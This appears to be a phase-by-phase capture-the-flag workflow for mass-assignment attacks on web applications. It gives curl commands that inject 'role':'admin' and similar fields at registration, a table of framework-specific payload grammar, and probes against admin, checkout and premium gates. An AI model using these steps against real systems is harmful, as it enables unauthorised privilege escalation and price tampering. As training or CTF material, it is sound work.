# Workflow deep — the engagement, phase by phase

## Phase 0 — challenge setup

```bash
python3 tools/state.py <name> --category web --target <url> \
  --challenge-name "<real>" --event "<event>"
python3 tools/classify.py "<obs>"
python3 tools/chain_match.py --record <name>
```

The classify + chain-match write the considered classes into the ledger
— `decide.py` then names the next class when a falsifier forces a layer
switch.

## Phase 1 — the endpoint map

```bash
python3 tools/web/bundle_miner.py --url <bundle-url> --out /tmp/bundle
# endpoints + routes + sources
curl -s -b "$JAR" "$BASE/api/me" | jq 'keys'
```

The two inventories: every body-accepting endpoint (the binder surface)
and every model field (the writable surface). The JS bundle names the
endpoints; the GETs name the fields.

## Phase 2 — the binder fingerprint

Response headers + error shapes → the binder family:

| Stack signal | Binder | Grammar |
|---|---|---|
| `X-Powered-By: Express` | merge or strict | flat + nested JSON |
| `user[...]` params | Rails strong params | `user[role]=admin` |
| `laravel_session` | `$fillable` | flat + `role[]=admin` |
| `csrftoken`, Django | ModelForm vs `create(**data)` | flat |
| `JSESSIONID` | bean binding | flat + nested |
| `.NET`/`IIS` | `[Bind]` | `Role` case-insensitive |

## Phase 3 — the control/canary pair

```bash
# control
curl -X POST "$BASE/api/register" -H 'Content-Type: application/json' \
  -d '{"username":"c1","password":"x"}' > ctrl.txt

# canary — ONE extra field
curl -X POST "$BASE/api/register" -H 'Content-Type: application/json' \
  -d '{"username":"n1","password":"x","role":"admin"}' > canary.txt

# read-back — different endpoint
curl "$BASE/api/users/n1" > rb.txt
```

Or the tool:

```bash
python3 tools/web/binding_probe.py --url "$BASE/api/register" \
  --body 'username=p&password=x' --readback "$BASE/api/me"
```

## Phase 4 — read the result

| Read-back | Verdict | Next cell |
|---|---|---|
| `role:"admin"` | STORED → leg 4 | exercise the gate |
| `role:"user"` | endpoint falsifier | nested → form → PATCH |
| `400 unknown property` | schema falsifier | form → multipart → PATCH |
| `role` absent | serializer-hidden | exercise directly |

## Phase 5 — the decision exercise

```bash
curl -b "$JAR" "$BASE/admin"            # role gate
curl -b "$JAR" -X POST "$BASE/checkout" # price/total gate
curl -b "$JAR" "$BASE/premium"          # plan gate
curl -b "$JAR" "$BASE/flag"             # verify gate
```

Stored + decision-changed = confirmed at impact.

## Phase 6 — widen or stop

The falsifier depth decides the remaining cells:

- content-type falsifier → form/multipart (one each);
- endpoint falsifier → nested/`PATCH`/`PUT`/method-override (one each);
- binder-family falsifier → `/import`/GraphQL/`/admin`;
- model falsifier → class dead; `decide.py`.

## Phase 7 — record

```bash
python3 tools/hooks.py post-probe <ch> \
  --request "PATCH /users/me role=admin" --verdict confirms \
  --class web-mass-assignment --hypothesis-id <id> \
  --evidence-kind class --evidence '"role":"admin"' \
  --response "$(cat rb.txt)"
```

Then the flag through `pre-flag` against its live response, and
`classify_solve.py --chain <id>` files the solve — promoting this class
from catalogue to verified.
